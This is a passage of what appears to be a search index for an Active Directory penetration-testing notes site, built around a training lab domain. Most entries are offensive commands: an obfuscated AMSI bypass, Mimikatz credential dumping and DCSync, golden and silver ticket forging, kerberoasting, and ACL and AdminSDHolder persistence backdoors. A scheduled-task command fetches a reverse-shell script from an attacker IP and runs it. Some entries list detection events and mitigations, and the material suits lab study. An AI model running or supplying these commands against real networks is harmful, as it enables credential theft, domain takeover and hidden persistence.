remote system to be used in subsequest Invoke-Command calls or entered later with Enter-PSSession. Useful for scripts New-PSSession -ComputerName ws01.lab.local One-to-Many - Fan-out Remoting #  Non-interactive Executes commands in parallel Run commands and scripts on  multiple remote computers in disconected sessions as background jobs   Good for pass-the-hash attacks and password spraying  # Execute command or scriptblock Invoke-Command -Scriptblock {$ExecutionContext.SessionState.LanguageMode} -ComputerName (Get-Content hosts.txt) # Execute scripts from files Invoke-Command -FilePath C:\\scripts\\Get-PassHashes.ps1 -ComputerName (Get-Content hosts.txt) # Execute locally loaded function on remote machines Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt) # Pass arguments. Can only be used for positional arguments Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt) -ArgumentList # Execute \u0026#34;stateful\u0026#34; commands using Invoke-Command $Sess = New-PSSession -ComputerName ws01.lab.local Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name} "}).add({id:8,href:"/active_directory/domain_enumeration/domain_computers/",title:"Domain Computers",description:"Enumerating domain computers.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get list of computers in current domain Get-ADComputer -Filter * -Properties * Get-ADComputer -Filter * | Select Name # Information about operating systems Get-ADComputer -Filter \u0026#39;OperatingSystem -Like \u0026#34;*Server 2016\u0026#34;\u0026#39; -Properties OperatingSystem | Select Name,OperatingSystem # Check for live hosts (depends on ICMP) Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get list of computers in current domain Get-NetComputer Get-NetComputer -FullData # Check for live hosts (depends on ICMP) Get-NetComputer -Ping # Information about operating systems Get-NetComputer -OperatingSystem \u0026#34;*Server 2016\u0026#34; Get-NetComputer -FullData | select dnshostname,operatingsystem # Get list of sessions on computer Get-NetSession -ComputerName \u0026#34;dc01.lab.local\u0026#34; # Find any computers with constrained delegation set Get-DomainComputer -TrustedToAuth # Find all servers that allow unconstrained delegation Get-DomainComputer -Unconstrained # Return the local *groups* of a remote server Get-NetLocalGroup SERVER.domain.local # Return the local group *members* of a remote server using Win32 API methods (faster but less info) Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local # enumerates computers in the current domain with \u0026#39;outlier\u0026#39; properties, i.e. properties not set from the firest result returned by Get-DomainComputer Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier "}).add({id:9,href:"/active_directory/lateral_movement/credential_dumping/",title:"Credential Dumping",description:"Credential dumping with Mimikatz.",content:"Invoke-Mimikatz # # Dump on local machine Invoke-Mimikatz -DumpCreds # Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command Invoke-Mimikatz -DumpCreds -ComputerName @(\u0026#34;sys1\u0026#34;, \u0026#34;sys2\u0026#34;) "}).add({id:10,href:"/active_directory/trust_attacks/cross_forest_attacks/",title:"Cross-Forest Attacks",description:"Cross-forest attacks.",content:"General #  Same attack flow as with cross-domain attacks But: trust between forest must be established manually No implicit trust Cannot abuse SID because of SID filtering We only get the privileges the user we are impersonating has in the target forest  Exploitation # # Get trust key for the inter-forest trust Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName dcorp-dc Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName dcorp-dc Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\ecorp$\u0026#34;\u0026#39; # Forge inter-forest TGT Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:eurocorp.local /rc4:9a3dafc4139bc3fb7b6dade2a35d6f74 /service:krbtgt /ticket:forest_tgt.kirbi\u0026#34;\u0026#39; # Request and inject TGS for CIFS service using Rubeus .\\Rubeus.exe asktgs /ticket:forest_tgt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt # Check access ls \\\\eurocorp-dc.eurocorp.local\\SharedWithDCorp\\ Mitigation # SID Filtering #  Avoid attacks which abuse SID history attribute across forest trust Enabled by default on all inter forest trusts. Intra forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary) But, since SID filtering has potential to break applications and user access, it is often disabled  Selective Authentication #  If configured in an inter-forest trust, users between trusts will not be automatically authenticated Invididual access to domains and servers in the trusting domain/forest should be given  "}).add({id:11,href:"/active_directory/general/installation/",title:"Installation",description:"Installation instructions for Active Directory.",content:"Setup DNS # # Install normal DNS server Install-WindowsFeature DNS # Register DNS records cmd /c ipconfig -registerdns Install AD DS on Server Core # # Install AD DS and management tools Install-WindowsFeature -Name ad-domain-services -IncludeManagementTools # Install new forest and domain Install-ADDSForest -DomainName \u0026#34;lab.local\u0026#34; Add Domain Controller # # Add domain controller and prompt for credentials Install-ADDSDomainController -DomainName \u0026#34;lab.local\u0026#34; -Credential (Get-Credential Lab\\Administrator) Create DC from IFM Media # \u0026#34; Create directory for image mkdir C:\\ifm \u0026#34; Launch ntdsutil ntdsutil ntdsutil: activate instance ntds ntdsutil: ifm ifm: create sysvol full c:\\ifm Transfer folder to target computer then run\nInstall-ADDSDomainController -DomainName \u0026#34;lab.local\u0026#34; -Credential (Get-Credential Lab\\Administrator) -InstallationMediaPath \u0026#34;C:\\ifm\u0026#34; Clone DC # # Get list of applications that do not support cloning Get-ADDCCloningExcludedApplicationList # Create list of applications that do support cloning Get-ADDCCloningExcludedApplicationList -GenerateXml # Create config file New-ADDCCloneConfigFile -Static -IPv4Address \u0026#34;192.168.47.13\u0026#34; -IPv4DNSResolver \u0026#34;192.168.47.10\u0026#34; -IPv4SubnetMask \u0026#34;255.255.255.0\u0026#34; -CloneComputerName \u0026#34;DC04\u0026#34; -IPv4DefaultGateway \u0026#34;192.168.47.2\u0026#34; # Shutdown computer and clone VM Stop-Computer Join Computer To Domain # # Add computer to domain and restart Add-Computer -DomainName \u0026#34;lab.local\u0026#34; -Restart # Rename computer and add to domain Add-Computer -DomainName \u0026#34;lab.local\u0026#34; -NewName \u0026#34;test\u0026#34; -Restart "}).add({id:12,href:"/active_directory/domain_privilege_escalation/kerberoasting/",title:"Kerberoasting",description:"Privilege escalation using Kerberoasting.",content:"Overview #  Request service ticket for any service with registered SPN Use ticket to crack service password Use BloodHound to find Kerberoastable accounts If service is a domain admin we can gather loot and dump the NTDS.dit If not, you can use it to log into other systems and pivot or escalate Use cracked password for password spraying  Exploitation # Find Accounts with SPN # # Windows built-in setspn -T DOMAIN -Q â€‹*/* # PowerView Get-NetUser -SPN | Select -ExpandProperty serviceprincipalname # AD Module Get-ADUser -Filter { ServicePrincipalName -ne \u0026#34;$null\u0026#34; } -Properties ServicePrincipalName Force Set SPN # If we have enough rights on user (GenericAll/GenericWrite) we can set an SPN for a user then request a TGS for it for Kerberoasting.\n# Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev # Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev Invoke-ACLScanner -ResolveGUIDs | ?{ $_.IdentityReferenceName -match \u0026#34;RDPUsers\u0026#34; } # Check if user already has a SPN # Using PowerView 3.0 Get-DomainUser -Identity support572user | Select serviceprincipalname # Using AD Module Get-ADUser -Identity support572user -Properties ServicePrincipalName | Select ServicePrincipalName # Set a SPN for the user (must be unique in domain) # Using PowerView 3.0 Set-DomainObject -Identity support572user -Set @{serviceprincipalname=\u0026#34;dcorp/bufusvc\u0026#34;} # Using AD Module Set-ADUser -Identity support572user -ServicePrincipalNames @{Add=\u0026#34;dcorp/bufusvc\u0026#34;} Extracting Tickets # # PowerShell built-in Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\u0026#34; # PowerView Request-SPNTicket -SPN \u0026#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\u0026#34; # Check if TGS has been granted klist # Extract tickets with mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::list /export\u0026#34;\u0026#39; python.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt \u0026#34;.\\1-40a10000-student572@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi\u0026#34; Extracting Hashes # # Rubeus # Find all kerberoastable users and save hashes to file .\\Rubeus.exe kerberoast /outfile:hashes.kirbi # For specific SPN .\\Rubeus.exe kerberoast /spn:MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local /outfile:mssqlsvc.kirbi # Using Invoke-Kerberoast.ps1 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII ticket.kirbi # Remotely with impacket GetUserSPNs.py dcorp-dc/user:password -dc-ip 10.10.10.10 -request # Crack hash with hashcat hashcat -a 0 -m 13100 hash.txt rockyou.txt Detection #  Security event ID 4769: A Kerberos ticket was requested Filter results based on the following information from logs  Service name should not be krbtgt Service name does not end with $ (to filter out machine accounts used for services) Account name should not be machine@domain (to filter out requests from machines) Failure code is \u0026lsquo;0x0\u0026rsquo; (to filter out failures, 0x0 is success) Most importantly, ticket encryption type is 0x17    Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=4769} -MaxEvents 1000 | ?{$_.Message.split\u0026#34;`n\u0026#34;)[8] -ne \u0026#39;krbtgt\u0026#39; -and $_.Message.split\u0026#34;`n\u0026#34;)[8] -ne \u0026#39;*$\u0026#39; -and $_.Message.split\u0026#34;`n\u0026#34;)[3] -notlike \u0026#39;*$@*\u0026#39; -and $_.Message.split\u0026#34;`n\u0026#34;)[18] -like \u0026#39;*0x0*\u0026#39; -and $_.Message.split\u0026#34;`n\u0026#34;)[17] -like \u0026#34;*0x17*\u0026#34;} | Select -ExpandProperty message Mitigation #  Strong service account passwords Don\u0026rsquo;t make service accounts domain admins Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management) https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj128431(v=ws.11)  "}).add({id:13,href:"/active_directory/domain_persistence/silver_tickets/",title:"Silver Tickets",description:"Persistence using Silver Tickets.",content:"General #  A valid TGS Encrypted and signed by NTLM hash of the target service account Services rarely check PAC (Privileged Attribute Certificate) Services will allow access only to the services themselves Reasonable persistence period (detauled 30 days for computer accounts)  Exploitation # Arguments #    Argument Description     kerberos::golden Name of the module (there is no Silver module!)   /domain:domain:dollarcorp.moneycorp.local Domain FQDN   /sid:S-1-5-21-1874506631-3219952063-538504511 SID of the domain   /target:dcorp dc.dollarcorp.moneycorp.local Target server FQDN   /User:Administrator Username for which the TGT is generated   /id:500 /groups:512 Optional User RID (default 500) and Group (default 513 512 520 518 519)   /service:cifs The SPN name of the target service for the TGS   /rc4:6f5b5acaf7433b3282ac22e21e62ff22 NTLM (RC4) hash of the service/machine account (\u0026lt;MACHINE-NAME$\u0026gt;). Use /aes128 and /aes256 for using AES keys.   /startoffset:0 Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future.   /endin:600 Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes   /renewmax:10080 Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800   /ptt Injects the ticket in current PowerShell process no need to save the ticket on disk    Commands # # Check Kerberos ticket policy using PowerView (Get-DomainPolicy -Domain lab.local).\u0026#34;Kerberos Policy\u0026#34; # Execute mimikatz on DC as DA to get dcorp-dc$ (machine account) hash Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch /user:dcorp-dc$\u0026#34;\u0026#39; -ComputerName \u0026#34;dcorp-dc\u0026#34; # Using hash of the DC computer account, below command provides access to shares on the DC # Similar command can be used for any other service on a machine # Example services: HOST, RPCSS, WSMAN Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\u0026#34;\u0026#39; # Use proper values from kerberos policy and AES keys to be stealthier Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /aes128:AES128KEY /aes256:AES256KEY /ptt\u0026#34;\u0026#39; # Get shell through PsExec .\\PsExec.exe -AcceptEULA \\\\dcorp-dc.dollarcorp.moneycorp.local cmd Getting Command Execution # Scheduled Tasks through HOST Service # # Create silver ticket for the HOST SPN which will allow us to schedule a task on the target Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\u0026#34;\u0026#39; # Create scheduled task schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU \u0026#34;NT Authority\\SYSTEM\u0026#34; /TN \u0026#34;STCheck\u0026#34; /TR \u0026#34;powershell.exe -c \u0026#39;iex (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://172.16.100.72/Invoke-PowerShellTcp.ps1\u0026#39;\u0026#39;\u0026#39;)\u0026#39;\u0026#34; # Run task on the target schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN \u0026#34;STCheck\u0026#34; # Clean Up schtasks /delete /tn \u0026#34;STCheck\u0026#34; /s dcorp-dc.dollarcorp.moneycorp.local /f WMI # # Create two tickets - one for HOST service and another for RPCSS Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:RPCSS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\u0026#34;\u0026#39; # Run WMI commands on DC Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local Detection #  Event IDs:  4624: Account Logon 4634: Account Logoff 4672: Admin Logon    Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=4672} -MaxEvents 1 | Format-List -Property * "}).add({id:14,href:"/active_directory/domain_enumeration/domain_groups/",title:"Domain Groups",description:"Enumerating domain groups.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get all groups in current domain Get-ADGroup -Filter * | Select Name Get-ADGroup -Filter * -Properties * # Get all groups containing the word \u0026#34;admin\u0026#34; in group name Get-ADGroup -Filter \u0026#39;Name -Like \u0026#34;*admin*\u0026#34;\u0026#39; | Select Name # Get all members of Domain Admins group Get-ADGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recursive # Get group membership for a user Get-ADPrincipalGroupMembership -Identity student1 PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get all groups in current domain Get-NetGroup Get-NetGroup -FullData # Get information about groups in other domain Get-NetGroup -Domain lab.local # Get all groups containing the word \u0026#34;admin\u0026#34; in group name Get-NetGroup \u0026#34;*admin*\u0026#34; # Get information about specific group Get-NetGroup -FullData \u0026#34;Domain Admins\u0026#34; # Get all members of Domain Admins group # If member is a group, get members of that group as well Get-NetGroupMember -GroupName \u0026#34;Domain Admins\u0026#34; -Recurse # Get list of Enterprise Admins, only available from forest root Get-NetGroupMember -GroupName \u0026#34;Enterprise Admins\u0026#34; -Domain lab.local # Get group membership for a user Get-NetGroup -UserName \u0026#34;student1\u0026#34; # List all local groups on a machine (needs administrator privileges on non-dc machines) Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups # Get members of all local groups on a machine (needs administrator privileges on non-dc machines) Get-NetLocalGroup -ComputerName dc.lab.local -Recurse # Find linked DA accounts using name correlation Get-DomainGroupMember \u0026#39;Domain Admins\u0026#39; | %{Get-DomainUser $_.membername -LDAPFilter \u0026#39;(displayname=*)\u0026#39;} | %{$a=$_.displayname.split(\u0026#39; \u0026#39;)[0..1] -join \u0026#39; \u0026#39;; Get-DomainUser -LDAPFilter \u0026#34;(displayname=*$a*)\u0026#34; -Properties displayname,samaccountname} # Find any machine accounts in privileged groups Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like \u0026#39;*$\u0026#39;} # Enumerate all groups in a domain that don\u0026#39;t have a global scope, returning just group names Get-DomainGroup -GroupScope NotGlobal -Properties name "}).add({id:15,href:"/active_directory/domain_persistence/acl_attacks/",title:"ACL Persistence",description:"Persistence using ACLs.",content:"AdminSDHolder # General #  Resides in the System container of a domain Used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups) Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder Any differences are overwritten on the object ACL Protected groups  Domain Admins Enterprise Admins Domain Controllers Read-only Domain Controllers Schema Admins Administrators Account Operators Backup Operators Server Operators Print Operators Replicator    Protected Groups Abuse (All of the below can log on locally to DC) #    Group Permissions     Account Operators Cannot modify DA/EA/BA groups. Can modify nested group within these groups.   Backup Operators Backup GPO, edit to add SID of controlled account to a privileged group and Restore   Server Operators Run a command as system (using the disabled Browser service)   Print Operators Copy ntds.dit backup, load device drivers    Exploitation #  With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it  # Add FullControl permission for a user to the AdminSDHolder using PowerView as DA Add-ObjectAcl -TargetADSprefix \u0026#39;CN=AdminSDHolder,CN=System\u0026#39; -PrincipalSamAccountName student572 -Rights All -Verbose # Using AD Module and Set-ADACL Set-ADACL -DistinguishedName \u0026#39;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -Principal student572 -Verbose # Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder Add-ObjectAcl -TargetADSprefix \u0026#39;CN=AdminSDHolder,CN=System\u0026#39; -PrincipalSamAccountName student572 -Rights ResetPassword -Verbose Add-ObjectAcl -TargetADSprefix \u0026#39;CN=AdminSDHolder,CN=System\u0026#39; -PrincipalSamAccountName student572 -Rights WriteMembers -Verbose # Run SDProp manually using Invoke-SDPropagator.ps1 to apply permissions immediately Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose # For Server 2008 and older Invoke-SDPropagator -taskName FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose # Check the Domain Admins permission as normal user # With PowerView Get-ObjectAcl -SamAccountName \u0026#34;Domain Admins\u0026#34; -ResolveGUIDs | ?{ $_.IdentityReference -match \u0026#39;student572\u0026#39; } # Using AD Module (Get-Acl -Path \u0026#39;AD:\\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\u0026#39;).Access | ?{ $_.IdentityReference -match \u0026#39;student572\u0026#39; } Abusing FullControl Rights # # Using PowerView_dev Add-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Members testda -Verbose # Using AD Module Add-ADGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Members testda Abusing ResetPassword Rights # # Using PowerView_dev Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force) -Verbose # Using AD Module Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force) -Verbose Rights Abuse # General #  Add useful rights to domain user With DA privileges we can modify the ACL for the domain root to provide  FullControl Ability to run DCSync    Exploitation # FullControl Rights # # Using PowerView Add-Object -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -PrincipalSamAccountName student572 -Rights \u0026#34;All\u0026#34; -Verbose # Using AD Module Set-ADACL -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -Principal student572 -Verbose # Add new Domain Admin # Using PowerView_dev Add-DomainGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Members testda -Verbose # Using AD Module Add-ADGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Members testda DCSync Rights # # Confirm if user already has DCSync rights with PowerView Get-ObjectAcl -DistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -ResolveGUIDs | ?{ ($_.IdentityReference -match \u0026#34;student572\u0026#34;) -and (($_.ObjectType -match \u0026#39;replication\u0026#39;) -or ($_.ActiveDirectoryRights -match \u0026#34;GenericAll\u0026#34;)) } # Using PowerView Add-ObjectAcl -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -PrincipalSamAccountName \u0026#34;student572\u0026#34; -Rights \u0026#34;DCSync\u0026#34; -Verbose # Using AD Module Set-ADACL -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -Principal student572 -GUIDRight \u0026#34;DCSync\u0026#34; -Verbose # Execute DCSync to dump hash for krbtgt account Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:dcorp\\krbtgt\u0026#34;\u0026#39; ResetPassword Rights # # Using PowerView Add-ObjectAcl -TargetADSprefix \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -PrincipalSamAccountName student572 -Rights \u0026#34;ResetPassword\u0026#34; -Verbose # Using AD Module Set-ADACL -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -Principal student572 -GUIDRight \u0026#34;ResetPassword\u0026#34; -Verbose # Reset password for account # Using PowerView_dev Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force) -Verbose # Using AD Module Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force) -Verbose WriteMembers Rights # # Using PowerView Add-ObjectAcl -TargetADSprefix \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -PrincipalSamAccountName student572 -Rights \u0026#34;WriteMembers\u0026#34; -Verbose # Using AD Module Set-ADACL -TargetDistinguishedName \u0026#39;DC=dollarcorp,DC=moneycorp,DC=local\u0026#39; -Principal student572 -GUIDRight \u0026#34;WriteMembers\u0026#34; -Verbose Security Descriptors # General #  It\u0026rsquo;s possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (secureable objects to allow access to non-admin users) Admin privileges required Security Description Definition Language defines format for Security Descriptors SDDL uses ACE strings for DACL and SACL  ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid  ACE for built-in administrators for WMI namespaces  A;CI;CCDCLCSWRPWPRCWD;;;SID Exploitation # Using samratashok\u0026rsquo;s RACE.ps1\nWMI # Modify ACLs to allow non-admin users access to securable objects\n# On local machine for user Set-RemoteWMI -SamAccountName student572 -Verbose # On remote machine for user without explicit credentials Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace \u0026#34;root\\cimv2\u0026#34; -Verbose # On remote machine with explicit credentials. Only root\\cimv2 and nested namespaces Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Credential Administrator -Namespace \u0026#34;root\\cimv2\u0026#34; -Verbose # Remove permission on remote machine Set-RemoteWMI -SamAccountName student572 -ComputerName dcorp-dc -Namespace \u0026#34;root\\cimv2\u0026#34; -Remove -Verbose PowerShell Remoting # Enable PS Remoting\n# On local machine Set-RemotePSRemoting -SamAccountName student572 -Verbose # On remote machine without credentials Set-RemotePSRemoting 